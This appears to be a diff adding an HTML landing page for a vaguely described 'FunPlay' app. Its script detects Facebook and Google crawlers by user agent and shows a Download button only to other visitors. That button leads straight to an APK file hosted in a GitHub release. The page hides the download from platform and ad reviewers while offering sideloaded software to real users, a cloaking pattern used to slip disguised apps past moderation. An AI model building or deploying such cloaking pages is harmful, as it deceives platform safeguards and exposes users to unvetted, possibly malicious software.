@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Daomo</title>
+
+<style>
+body {
+    margin:0;
+    font-family: Arial;
+    background:#f5f5f5;
+    text-align:center;
+}
+
+.container {
+    max-width:400px;
+    margin:50px auto;
+    background:white;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+
+button {
+    background:#28c76f;
+    border:none;
+    padding:15px;
+    color:white;
+    font-size:16px;
+    border-radius:10px;
+    width:100%;
+    cursor:pointer;
+}
+
+.hidden {
+    display:none;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>FunPlay</h2>
+<p>Enjoy fun entertainment anytime</p>
+
+<button id="downloadBtn" class="hidden" onclick="downloadApp()">Download</button>
+
+<p id="safeText">Explore amazing features and content.</p>
+
+</div>
+
+<script>
+
+// ===== DETECT BOT =====
+function isBot() {
+    let ua = navigator.userAgent.toLowerCase();
+
+    let bots = [
+        "facebookexternalhit",
+        "facebot",
+        "facebook",
+        "googlebot",
+        "crawler",
+        "spider"
+    ];
+
+    for (let i = 0; i < bots.length; i++) {
+        if (ua.includes(bots[i])) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// ===== SHOW CONTENT =====
+if (!isBot()) {
+    document.getElementById("downloadBtn").classList.remove("hidden");
+}
+
+// ===== DOWNLOAD =====
+function downloadApp() {
+    window.location.href = "https://github.com/alaskaming-hub/Daomo/releases/download/v1.0/DaoMo.apk";
+}
+
+</script>
+
+</body>
+</html>
